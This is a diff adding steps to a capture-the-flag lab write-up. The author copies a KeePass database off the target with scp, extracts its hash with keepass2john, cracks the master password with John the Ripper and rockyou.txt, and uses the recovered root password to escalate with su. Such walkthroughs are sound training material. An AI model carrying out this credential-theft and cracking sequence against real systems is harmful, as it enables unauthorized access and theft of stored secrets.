@@ -210,6 +210,76 @@ cat user.txt
 ```
 <img alt="Zrzut ekranu 2026-09-6 o 16 42 27" src="https://github.com/user-attachments/assets/11b36fb3-48af-4c55-b2a1-7fe56ec2271d" />
 
+### 📂 Exploring the Backups Directory
+
+Continuing enumeration within the `sysadmin` user environment, I navigated to the `backups` directory found in the home folder:
+
+```bash
+cd backups/
+ls
+cat README.txt
+```
+<img alt="Zrzut ekranu 2026-09-6 o 16 44 47" src="https://github.com/user-attachments/assets/457ffa0f-9fa0-4ae0-bfb1-07704ec6bf3d" />
+
+### 📥 Exfiltrating the KeePass Database
+
+To crack the encrypted `infrastructure.kdbx` file offline, I transferred it directly to the attack box using `scp`:
+
+```bash
+scp sysadmin@10.112.173.195:/home/sysadmin/backups/infrastructure.kdbx .
+```
+<img alt="image" src="https://github.com/user-attachments/assets/f3688891-1962-4d1c-9cb5-0ca240b0b23c" />
+
+### 🔓 Extracting the KeePass Database Hash
+
+To crack the master password with John the Ripper, I extracted the database hash using `keepass2john` and saved it to `hash.txt`:
+
+```bash
+john-the-ripper.keepass2john infrastructure.kdbx > hash.txt
+```
+<img alt="Zrzut ekranu 2026-09-6 o 16 47 45" src="https://github.com/user-attachments/assets/45b79602-80f0-4441-a7c8-331650f86ae1" />
+
+```bash
+cat hash.txt
+```
+<img alt="Zrzut ekranu 2026-09-6 o 16 48 08" src="https://github.com/user-attachments/assets/85b8328d-a579-47e5-855a-d3be1660377f" />
+
+### 💥 Cracking the KeePass Master Password
+
+With the hash saved in `hash.txt`, I launched John the Ripper using the standard `rockyou.txt` wordlist specifying the `KeePass` format:
+
+```bash
+john --wordlist=/usr/share/wordlists/rockyou.txt --format=KeePass hash.txt
+```
+<img alt="Zrzut ekranu 2026-09-6 o 16 49 00" src="https://github.com/user-attachments/assets/6c6c3aea-3892-454d-8e9b-91470249e6cf" />
+
+### 🔑 Unlocking the KeePass Database
+
+Using the recovered master password (`spring`), I opened `infrastructure.kdbx` using **KeePassXC**.
+
+Inside the `backup` group, I located an entry titled **Root User Password - Sensitive** containing stored credentials for the system's `root` user:
+<img alt="Zrzut ekranu 2026-09-6 o 16 50 27" src="https://github.com/user-attachments/assets/fdbbf764-358d-4543-a422-90eb7a33c4f3" />
+
+### 👑 Vertical Privilege Escalation & Root Flag Retrieval
+
+By toggling the visibility option in KeePassXC, we revealed the cleartext root password stored within the database.
+
+Returning to our SSH session as `sysadmin`, I switched to the `root` account using the `su` command and entered the retrieved password:
+
+```bash
+su root
+```
+<img alt="Zrzut ekranu 2026-09-6 o 16 51 26" src="https://github.com/user-attachments/assets/9095b947-90f4-495d-83d1-02cf50a5cc97" />
+<img alt="Zrzut ekranu 2026-09-6 o 16 51 43" src="https://github.com/user-attachments/assets/b47e5392-b893-4a1f-8680-8fd1e5a85741" />
+
+
+
+
+
+
+
+
+
 
 
 
